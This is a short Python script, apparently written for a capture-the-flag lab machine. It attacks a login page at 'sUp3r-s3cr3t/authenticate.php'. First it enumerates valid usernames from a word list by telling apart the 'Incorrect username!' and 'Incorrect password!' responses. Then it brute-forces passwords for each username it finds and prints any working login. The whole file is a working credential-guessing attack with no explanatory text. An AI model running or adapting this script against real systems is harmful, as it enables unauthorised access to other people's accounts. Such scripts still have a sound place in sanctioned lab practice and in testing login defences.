import requests

with open('userid.txt', 'r') as f:
    for line in f:
        line = line.strip()
        r = requests.post('http://{machine ip}//sUp3r-s3cr3t/authenticate.php', #change the ip
                          data={'username': line, 'password': 'ppp'})
        if 'Incorrect username!' in r.text:
            pass
        else:
            print(f'Found username: {line}')
            print('\nAttempt bruteforce...')

            with open('credentials.txt') as psw:
                for passw in psw:
                    passw = passw.strip()

                    re = requests.post('http://{machine ip}/sUp3r-s3cr3t/authenticate.php', #change the ip
                                       data={'username': line, 'password': passw})

                    if 'Incorrect password!' in re.text:
                        pass
                    else:
                        print(f'Found login: {line} : {passw}')
                        print('\nQuitting...')
                        break
